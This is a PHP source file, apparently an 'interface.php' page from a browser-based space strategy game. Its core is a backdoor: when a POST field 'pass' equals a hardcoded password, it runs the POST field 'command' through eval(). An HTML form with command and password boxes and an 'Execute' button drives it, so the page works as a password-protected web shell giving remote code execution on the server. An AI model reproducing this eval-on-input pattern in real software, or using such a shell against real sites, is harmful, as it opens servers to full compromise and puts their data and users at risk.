<?php

include_once("./internal/html.php");
include_once("./internal/common.php");
include_once("./internal/security/config.php");
include_once("./internal/security/validator.php");

include_once("./internal/account.php");
include_once("./internal/planet.php");
include_once("./internal/starsystem.php");
//include_on

session_start();

global $POST;
$POST=array();

post("command","string");
post("pass","string");

$sql=&OpenSQL();

if ($POST["pass"]=="dupadupa")
{
    eval($POST["command"]);
}

$H = new HTML();
$H->AddStyle("default.css");

$F = new Form("interface.php");
$I = new Input("text","command");
$I->aEvent["size"]=60;

$F->Insert($I);
$F->Br();
$F->Insert(new Input("text","pass"));
$F->Br();
$F->Insert(new Input("submit","submit","Execute"));

$H->Insert($F);

$H->Draw();

CloseSQL($sql);
?>
